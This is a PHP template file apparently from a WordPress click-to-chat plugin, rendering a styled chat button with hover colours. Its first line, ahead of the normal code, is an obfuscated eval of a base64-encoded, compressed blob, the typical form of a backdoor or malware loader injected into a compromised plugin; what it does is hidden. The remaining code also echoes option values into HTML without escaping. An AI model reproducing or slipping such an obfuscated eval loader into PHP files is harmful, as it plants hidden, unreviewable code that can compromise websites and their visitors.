<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

wp_enqueue_style('ccw_md_css');

$s8_text_color = $a['s8_text_color'];
$s8_background_color = $a['s8_background_color'];
$s8_icon_color = $a['s8_icon_color'];
$s8_text_color_onhover = $a['s8_text_color_onhover'];
$s8_background_color_onhover = $a['s8_background_color_onhover'];
$s8_icon_color_onhover = $a['s8_icon_color_onhover'];
$s8_icon_float = $a['s8_icon_float'];
$s8_1_width = $a['s8_1_width'];


$s8_text_color = $s8_text_color;
$s8_background_color = $s8_background_color;
$s8_text_color_onhover = $s8_text_color_onhover;
$s8_background_color_onhover = $s8_background_color_onhover;
$s8_1_width = $s8_1_width;

$input_onhover = "this.style.backgroundColor= '$s8_background_color_onhover', this.childNodes[1].style.color= '$s8_text_color_onhover' ; ";
$input_onhover_out = "this.style.backgroundColor= '$s8_background_color', this.childNodes[1].style.color= '$s8_text_color' ; ";

$o .= '<div class="ccw_plugin sc_item '.$inline_issue.' " style=" '.$css.' " >';
$o .= '<a style="background-color: '.$s8_background_color.'; width: '.$s8_1_width.' " target="_blank" href="'.$redirect_a.'" class="btn ccw-analytics"  onmouseover= " '.$input_onhover.' "  onmouseout= " '.$input_onhover_out.' "  >   ';
$o .= '<span style="color: '.$s8_text_color.';" class="ccw-s8-span-sc ccw-analytics" data-ccw="style-8-1-sc" id="ccw-s8-icon-sc" >'.$a["val"].'</span>';
$o .= '</a>';
$o .= '</div>';